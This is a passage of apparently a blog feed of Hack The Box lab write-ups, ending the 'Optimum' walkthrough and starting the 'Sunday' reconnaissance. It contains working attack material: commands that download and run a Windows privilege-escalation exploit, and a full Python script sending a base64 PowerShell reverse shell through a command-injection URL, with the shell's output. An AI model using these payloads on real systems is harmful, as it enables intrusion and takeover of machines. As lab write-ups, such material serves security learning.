ctf@014202efa8c8:~/htb/optimus/http$ sudo python3 -m http.server <span style="color:#bd93f9">80</span>                                <span style="color:#ff79c6">[</span>265/276<span style="color:#ff79c6">]</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
172.19.0.1 - - <span style="color:#ff79c6">[</span>19/Sep/2020 02:47:44<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /nc.exe HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
</code></pre></td></tr></table>
</div>
</div><h1 id="privesc">Privesc</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/optimus$ <span style="color:#8be9fd;font-style:italic">cd</span> http
ctf@014202efa8c8:~/htb/optimus/http$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
ctf@014202efa8c8:~/htb/optimus/http$ sudo python3 -m http.server <span style="color:#bd93f9">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
172.19.0.1 - - <span style="color:#ff79c6">[</span>19/Sep/2020 03:28:51<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /41020.exe HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;powershell -c <span style="color:#f1fa8c">&#34;Invoke-WebRequest -Uri http://10.10.14.38/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&#34;</span>
powershell -c <span style="color:#f1fa8c">&#34;Invoke-WebRequest -Uri http://10.10.14.38/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe&#34;</span>

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;41020.exe
41020.exe
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;whoami
whoami
nt authority<span style="color:#f1fa8c">\s</span>ystem
</code></pre></td></tr></table>
</div>
</div><h1 id="using-python-and-powershell-without-ncexe">Using python and powershell without nc.exe</h1>
<p>We can leverage the command injection to send a powershell payload</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python2</span>
<span style="color:#6272a4"># Author: Alamot</span>
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">import</span> urllib<span style="color:#ff79c6">,</span> urllib2
<span style="color:#ff79c6">from</span> base64 <span style="color:#ff79c6">import</span> b64encode

<span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">5</span>):
    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;usage: &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span>)
    exit()

RHOST <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]
RPORT <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">2</span>]
LHOST <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">3</span>]
LPORT <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">4</span>]

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;RHOST=&#34;</span><span style="color:#ff79c6">+</span>RHOST<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; RPORT=&#34;</span><span style="color:#ff79c6">+</span>RPORT<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; LHOST=&#34;</span><span style="color:#ff79c6">+</span>LHOST<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; LPORT=&#34;</span><span style="color:#ff79c6">+</span>LPORT<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)

payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span style="color:#ff79c6">+</span>LHOST<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;&#39;,&#34;</span><span style="color:#ff79c6">+</span>LPORT<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span style="color:#f1fa8c">{0}</span><span style="color:#f1fa8c">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>

<span style="color:#8be9fd;font-style:italic">print</span>(payload<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)

b64enc_command <span style="color:#ff79c6">=</span> b64encode(payload<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;UTF-16LE&#39;</span>))<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;+&#39;</span>,<span style="color:#f1fa8c">&#39;%2b&#39;</span>)

url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://&#34;</span><span style="color:#ff79c6">+</span>RHOST<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;:&#34;</span><span style="color:#ff79c6">+</span>RPORT<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;/?search=%00{.exec%7CC:</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Windows</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">System32</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">WindowsPowerShell</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">v1.0</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">powershell.exe%20-EncodedCommand%20&#34;</span><span style="color:#ff79c6">+</span>b64enc_command<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;.}&#34;</span>

<span style="color:#8be9fd;font-style:italic">print</span>(url)
response <span style="color:#ff79c6">=</span> urllib2<span style="color:#ff79c6">.</span>urlopen(url)
<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">STATUS: &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(response<span style="color:#ff79c6">.</span>getcode()))
</code></pre></td></tr></table>
</div>
</div><p>Then we simply execute</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/optimus$ vi send_powershell_payload.py
ctf@014202efa8c8:~/htb/optimus$ python2 send_powershell_payload.py 10.10.10.8 <span style="color:#bd93f9">80</span> 10.10.14.38 <span style="color:#bd93f9">9000</span>
<span style="color:#8be9fd;font-style:italic">RHOST</span><span style="color:#ff79c6">=</span>10.10.10.8 <span style="color:#8be9fd;font-style:italic">RPORT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">80</span> <span style="color:#8be9fd;font-style:italic">LHOST</span><span style="color:#ff79c6">=</span>10.10.14.38 <span style="color:#8be9fd;font-style:italic">LPORT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">9000</span>

<span style="color:#8be9fd;font-style:italic">$client</span> <span style="color:#ff79c6">=</span> New-Object System.Net.Sockets.TCPClient<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;10.10.14.38&#39;</span>,9000<span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">$stream</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$client</span>.GetStream<span style="color:#ff79c6">()</span>; <span style="color:#ff79c6">[</span>byte<span style="color:#ff79c6">[]]</span><span style="color:#8be9fd;font-style:italic">$bytes</span> <span style="color:#ff79c6">=</span> 0..65535|%<span style="color:#ff79c6">{</span>0<span style="color:#ff79c6">}</span>; <span style="color:#ff79c6">while</span><span style="color:#ff79c6">((</span><span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$stream</span>.Read<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$bytes</span>, 0, <span style="color:#8be9fd;font-style:italic">$bytes</span>.Length<span style="color:#ff79c6">))</span> -ne 0<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>; <span style="color:#8be9fd;font-style:italic">$data</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span style="color:#ff79c6">)</span>.GetString<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$bytes</span>,0, <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">$sendback</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>iex <span style="color:#8be9fd;font-style:italic">$data</span> 2&gt;&amp;<span style="color:#bd93f9">1</span> | Out-String <span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">$sendback2</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$sendback</span> + <span style="color:#f1fa8c">&#39;PS &#39;</span> + <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">pwd</span><span style="color:#ff79c6">)</span>.Path + <span style="color:#f1fa8c">&#39;&gt; &#39;</span>; <span style="color:#8be9fd;font-style:italic">$sendbyte</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">([</span>text.encoding<span style="color:#ff79c6">]</span>::ASCII<span style="color:#ff79c6">)</span>.GetBytes<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$sendback2</span><span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">$stream</span>.Write<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$sendbyte</span>,0,<span style="color:#8be9fd;font-style:italic">$sendbyte</span>.Length<span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">$stream</span>.Flush<span style="color:#ff79c6">()}</span>; <span style="color:#8be9fd;font-style:italic">$client</span>.Close<span style="color:#ff79c6">()</span>;

http://10.10.10.8:80/?search<span style="color:#ff79c6">=</span>%00<span style="color:#ff79c6">{</span>.exec%7CC:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\W</span>indowsPowerShell<span style="color:#f1fa8c">\v</span>1.0<span style="color:#f1fa8c">\p</span>owershell.exe%20-EncodedCommand%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMwA4ACcALAA5ADAAMAAwACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAgAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA7AA<span style="color:#ff79c6">==</span>.<span style="color:#ff79c6">}</span>

STATUS: <span style="color:#bd93f9">200</span>
ctf@014202efa8c8:~/htb/optimus$
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ctf@014202efa8c8:~/htb/optimus$ rlwrap nc -lnvp <span style="color:#bd93f9">9000</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>

Connection received on 172.19.0.1 <span style="color:#bd93f9">53352</span>
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt; whoami
optimum<span style="color:#f1fa8c">\k</span>ostas
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Sunday</title><link>https://0xade1.github.io/posts/2020/09/htb-sunday/</link><pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-sunday/</guid><description>nmap Quick scan
1 2 3 4 5 6 7 nmap -p- -T4 --min-rate=5000 10.10.10.76 PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 22022/tcp open unknown 41931/tcp open unknown 64172/tcp open unknown Most notable is finger
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 &amp;gt;nmap -p79,111,22022,41931,64172 -sC -sV -oA nmap/sunday 10.10.10.76 Starting Nmap 7.80 ( https://nmap.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<p>Quick scan</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p- -T4 --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> 10.10.10.76
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
41931/tcp open  unknown
64172/tcp open  unknown
</code></pre></td></tr></table>
</div>
</div><p>Most notable is finger</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;nmap -p79,111,22022,41931,64172 -sC -sV -oA nmap/sunday 10.10.10.76
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-19 18:17 HKT
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.76
Host is up <span style="color:#ff79c6">(</span>0.050s latency<span style="color:#ff79c6">)</span>.

PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on<span style="color:#f1fa8c">\x</span>0D
111/tcp   open  rpcbind 2-4 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100000)</span>
22022/tcp open  ssh     SunSSH 1.3 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">1024</span> d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e <span style="color:#ff79c6">(</span>DSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">1024</span> e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
41931/tcp open  unknown
64172/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o☀sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 40.74 seconds
</code></pre></td></tr></table>
</div>
</div><p>We get <a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">finger-user-enum</a> from pentestmonkey</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
